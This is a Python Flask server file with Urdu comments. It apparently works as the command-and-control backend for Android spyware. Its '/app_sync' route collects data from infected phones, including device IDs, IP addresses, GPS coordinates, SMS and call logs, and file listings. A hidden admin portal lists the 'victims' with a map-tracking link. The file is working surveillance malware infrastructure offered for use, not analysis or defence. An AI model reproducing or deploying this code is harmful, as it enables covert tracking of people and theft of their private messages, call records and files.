import os
import base64
import datetime
import json
from flask import Flask, request, render_template_string, send_from_directory, jsonify

app = Flask(__name__)

# --- ڈیٹا سٹوریج (Data Storage) ---
# ایپ سے آنے والی فائلز اور آڈیو کے لیے فولڈرز
STORAGE_DIR = "captured_data"
AUDIO_DIR = "captured_audio"
APP_DATA_LOGS = "app_logs"

for folder in [STORAGE_DIR, AUDIO_DIR, APP_DATA_LOGS]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# تمام ڈیٹا اس لسٹ میں جمع ہوگا
victims_list = []

# --- سرور فنکشنز (Server Logic) ---

@app.route('/')
def home():
    return "<h1>System Online</h1><p>Waiting for connection...</p>"

# آپ کا خفیہ ایڈمن پینل لنک
@app.route('/admin_master_portal_2026') 
def admin_panel():
    return render_template_string(ADMIN_HTML, victims=victims_list)

@app.route('/media/<path:filename>')
def get_file(filename):
    return send_from_directory(STORAGE_DIR, filename)

# اینڈرائیڈ ایپ سے ڈیٹا وصول کرنے کا مین راستہ (Main APK Route)
@app.route('/app_sync', methods=['POST'])
def app_sync():
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr) or request.remote_addr
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # ڈیٹا کو پینل کے لیے تیار کرنا
        data['ip'] = ip
        data['timestamp'] = ts
        
        # اگر نیا وکٹم ہے تو لسٹ میں ڈالیں، ورنہ اپڈیٹ کریں
        exists = False
        for v in victims_list:
            if v.get('device_id') == data.get('device_id'):
                v.update(data)
                exists = True
                break
        if not exists:
            victims_list.insert(0, data)
            
        return jsonify({"status": "success", "msg": "Sync Complete"}), 200
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 500

# --- پروفیشنل ایڈمن پینل ڈیزائن (ADMIN_HTML) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TERMINAL COMMAND CENTER</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .header { text-align: center; border-bottom: 2px solid #00ff41; margin-bottom: 30px; padding-bottom: 10px; }
        .card { background: #000; border: 1px solid #00ff41; border-left: 8px solid #00ff41; padding: 20px; margin-bottom: 25px; border-radius: 5px; box-shadow: 0 0 15px rgba(0, 255, 65, 0.2); }
        .label { color: #ff0055; font-weight: bold; text-transform: uppercase; font-size: 12px; }
        .value { color: #fff; margin-bottom: 10px; display: block; }
        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .scroll-box { background: #111; border: 1px solid #333; padding: 10px; height: 150px; overflow-y: scroll; color: #00ff41; font-size: 13px; }
        .btn-map { background: #00ff41; color: #000; padding: 5px 15px; text-decoration: none; font-weight: bold; border-radius: 3px; }
        .status-online { color: #00ff41; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛰️ GLOBAL DATA RECEPTOR (v3.0)</h1>
        <p>TOTAL ACTIVE CONNECTIONS: {{ victims|length }} | <span class="status-online">● SYSTEM LIVE</span></p>
    </div>

    {% for v in victims %}
    <div class="card">
        <div class="data-grid">
            <div>
                <p><span class="label">DEVICE ID:</span> <span class="value">{{ v.device_id if v.device_id else 'UNKNOWN_APK' }}</span></p>
                <p><span class="label">IP ADDRESS:</span> <span class="value" style="color:#00d9ff;">{{ v.ip }}</span></p>
                <p><span class="label">LAST SYNC:</span> <span class="value">{{ v.timestamp }}</span></p>
                <p><span class="label">LOCATION:</span> <span class="value">{{ v.lat }}, {{ v.lon }}</span>
                   <a href="https://www.google.com/maps?q={{ v.lat }},{{ v.lon }}" target="_blank" class="btn-map">TRACK MAP</a></p>
            </div>
            <div>
                <p><span class="label">DEVICE INFO:</span> <span class="value">{{ v.model }} | RAM: {{ v.ram }} | Batt: {{ v.battery }}</span></p>
                <p><span class="label">SMS & CALL LOGS:</span></p>
                <div class="scroll-box">
                    {{ v.all_data if v.all_data else 'No data received yet...' }}
                </div>
            </div>
        </div>
        
        <div style="margin-top: 20px; border-top: 1px solid #222; padding-top: 10px;">
            <p><span class="label">FILE SYSTEM ACCESS:</span></p>
            <div class="scroll-box" style="height: 80px;">
                {{ v.files_list if v.files_list else 'Scanning storage...' }}
            </div>
        </div>
    </div>
    {% endfor %}

    <script>setTimeout(() => { location.reload(); }, 15000);</script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
